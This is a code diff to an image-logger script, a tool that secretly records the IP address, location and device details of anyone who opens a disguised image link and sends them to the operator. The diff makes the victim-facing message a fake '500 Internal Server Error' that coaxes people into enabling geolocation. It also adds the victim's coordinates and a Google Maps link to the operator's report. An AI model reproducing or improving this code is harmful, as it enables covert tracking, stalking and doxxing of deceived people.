@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "Sorry, image cant be accessed right now: Error Code 502", # Message to show
+        "message": "500 Internal Server Error: The server encountered an internal error and was unable to complete your request. Optionally, activate geolocation for our bot free website.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -144,13 +144,12 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "ExtraLogger",
             "color": config["color"],
-            "description": f"""**SOMEONE ACTUALLY FELL FOR IT 😂🤣🤦‍♂️**
-
-**Endpoint:** `{endpoint}`
+            "description": f"""**INFO ABOUT PERSON:**
             
 **IP Info:**
+> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
 > **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
 > **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
@@ -234,6 +233,7 @@ height: 100vh;
                 message = config["message"]["message"]
 
                 if config["message"]["richMessage"] and result:
+                    message = message.replace("{lat}", str(result["lat"]))
                     message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                     message = message.replace("{mobile}", str(result["mobile"]))
                     message = message.replace("{vpn}", str(result["proxy"]))
